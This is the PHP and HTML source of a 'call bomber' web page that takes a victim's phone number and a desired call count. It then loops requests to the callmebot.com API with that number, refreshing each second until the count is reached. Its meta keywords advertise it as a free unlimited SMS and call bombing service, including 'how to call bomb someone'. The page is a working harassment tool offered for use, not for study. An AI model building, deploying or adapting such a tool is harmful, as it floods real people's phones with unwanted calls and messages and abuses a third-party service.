<?php
session_start();
error_reporting(0);
?>
<!DOCTYPE html>
<html lang="en">
  <head>
  <meta name="title"
    content="We Provide Best Unlimited free Call+sms Bomber And Other Web-Tools In 2023">
  <meta name="description"
    content="It Is The Best Free Call Bomber Service The World. We provide best free unlimited call bomber in 2023. You can send huge monunt of call  by using our online call bomber.">
  <meta name="keywords"
    content="call bomber, call bomber.in, Call Bomber 2023,  call sms bomber, Unlimited call bomber, call bomber website, sms bomber, call bomber app, free callbomber, call bomber fast, unlimited sms bomber, unprotact number from callbomber, call bombing,sms bomber tools, how to stop call bomber, callbomer new key, whatsapp bomber sms, whatsapp bombing, sms bomber stop, bomb it calls, whatsapp call bomber, super fast call bomber, call bomber 1000 msg send, how to unprotect number from call bomber, call bomber fastest, bombing tools, call bomber fastest, how to call bomb someone,  callbomber , Best Call Bomber, International Call Bomber, Sms Bomber, Custom Sms Bomber, Next Bomb, Whatsapp Bomber, call bomber whatsapp, whatsapp sms bomber, super fast bomber">
  <meta name="author" content="Alfa-Bomb">
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Alfa Paid Server</title>
    <link rel="stylesheet" href="#" />
    <style>
     *{
        margin: 0px;
        padding: 0px;
        overflow: hidden;
        text-align: center;
    }
    body{
      background:#333;
    }

    .heading{
        display: flex;
        margin-top:50px;
        margin-bottom:50px;
        height: 100px;
        justify-content: center;
        align-items: center;
    }

    .heading img{
        width: 80px;
        border-radius:50%;
        margin:10px;
    }

    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
        -webkit-appearance: none;
        margin: 0;
    }

    input[type=number] {
        -moz-appearance: textfield;
    }

    .heading h2{
      color: color:#333;;
      font-family: "Courier", monospace;
    }
    
    .form{
        display:flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;

    }
    .forminput{
        font-size: 20px;
        text-align: center;
        border-radius: 23px;
        display: block;
        margin: 13px;
    } 
    .btns{
        display: block;
        background: #0D6EFD;
        border: 0;
        border-radius:23px;
        color: white;
        font-family: Space Grotesk;
        text-transform: uppercase;
        cursor: pointer;
        margin: auto;
        padding: 10px;
        font-size: 25px;
    }
    .btns:hover{
            background: #000;
        }

    .footerbar{
        color: #333;
        font-family: Space Grotesk;
        font-weight: bold;
        padding-top: 10px;
    }

        .bomb-start{
            color: #000;
            display: flex;
            padding-top: 10px;
            font-family: Space Grotesk;
            justify-content: center;
            align-items: center;
        }
        .bomb-count{
            display: flex;
            justify-content: center;
            align-items: center;
            color: red;
            padding-top: 10px;
        }
        #stop-btn{
            position: relative;
            display: inline-block;
            background:#0D6EFD;
            border-radius:23px;
            font-size: 18px;
            text-transform: uppercase;
            color: #fff;
            text-decoration: none;
            padding: 20px 30px;
            font-weight: 500;
            margin-top: 15px;
        }
        
    </style>
  </head>
  <body>
      <div class="bg-img">
    <div class="heading">
      <a href="index.html"><img src="assets/images/logo.jpg"></a>
      <h2>Call BOMBER PRIME</h2>
    </div>
    <?php
    
    if(isset($_GET['submit'])){
    $number = $_GET['number'];
    $getlimit = $_GET['countnumber'];
	$currentlimit=$_SESSION['limitset'];
		
    function RandomNumber($length)
{
$str="";
for($i=0;$i<$length;$i++){
$str.=mt_rand(0,9);
}
return $str;
}
$n = array('charan','raaghu','sumit','chandru','rishab','tanmay','ravi','riya','deepak','shashi','revanth','smitha','gowri','arun','arpitha','anusha','chinmay','thilak','manu','mithun','rahul','abhishek','kavya','kavitha','savitha','sachin','manohar','ajay','anurag','madhu','kushal','anil','askash','yogesh','vidya','rajesh','sagar','madhan','vishal','ramya','riyanth','ravishankar','radha','raju','sudha','avinash','fidju','arihanth','babu','priya','preethi','priyanka','preetham','suman','sunitha','tanu','manu','mahesh','mahendra','manoj','vikas','abhinav','arya','raaghu','sumit','chandru','rishab','tanmay','ravi','riya','deepak','shashi','revanth','smitha','gowri','arun','arpitha','anusha','chinmay','thilak','manu','mithun','rahul','abhishek','kavya','kavitha','savitha','sachin','manohar','ajay','anurag','madhu','kushal','anil','askash','yogesh','vidya','rajesh','sagar','madhan','vishal','ramya','riyanth','ravishankar','radha','raju','sudha','avinash','fidju','arihanth','babu','priya','preethi','priyanka','ananth','sumana','saritha','yogesh','razz');
$fname = $n[mt_rand(0,count($n))];	

$imei=RandomNumber(15);
$user=RandomNumber(21);

if("$currentlimit" == "$getlimit"){
echo"<span class='bomb-start'>successfully Bombed ".$getlimit."</span>"; exit;}
		
/*  URL , HEADERS &  DATA     */

$user = '@IsleXCat';
$text = urlencode($number);

$url21 = "https://api.callmebot.com/text.php?user=$user&text=$text";

$response = file_get_contents($url21);


$user1 = '@apibotlebro';
$text1 = urlencode($number);

$url200 = "https://api.callmebot.com/text.php?user=$user1&text=$text1";

$response = file_get_contents($url200);

//Api 22//




/**************************************/
  $_SESSION["limitset"] +="10";
  echo "<span class='bomb-start'>Bombing Start On This No. : ".$number."</span>";
  echo "<span class='bomb-count'>Call => ".$currentlimit."</span>";
  echo "<a href='callBomb.php' id='stop-btn'>stop</a>";
  echo "<meta http-equiv='refresh' content='1'>";
}
    if(!isset($_GET['submit'])){
    session_unset();
    session_destroy();
    echo'<div class="form">
      <form action="" method="GET">
          <input class="forminput" type="number" name="number" placeholder="Enter Calling No. " />
          <input class="forminput"type="number" name="countnumber" placeholder="Enter No. Of Calls" />
        <input class="btns" type="submit" value="submit" name="submit" />
      </form>
    </div>';
    }
    ?>
    </div>
    <script>
    function stopBomb(){
    }
    </script>
  </body>
</html>